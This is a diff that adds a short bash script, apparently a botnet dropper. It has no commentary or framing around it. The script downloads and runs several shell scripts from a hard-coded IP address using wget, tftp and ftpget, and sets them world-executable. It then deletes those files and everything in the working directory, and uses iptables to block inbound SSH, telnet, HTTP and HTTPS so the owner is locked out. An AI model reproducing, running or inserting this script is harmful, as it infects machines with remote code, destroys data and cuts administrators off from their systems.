@@ -1,0 +1,3 @@
+#!/bin/bash
+
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.142.236.234/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 185.142.236.234 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 185.142.236.234; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 185.142.236.234 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf * && iptables -I INPUT -p tcp --dport 22 -j DROP && iptables -I INPUT -p tcp --dport 23 -j DROP && iptables -I INPUT -p tcp --dport 80 -j DROP && iptables -I INPUT -p tcp --dport 443 -j DROP
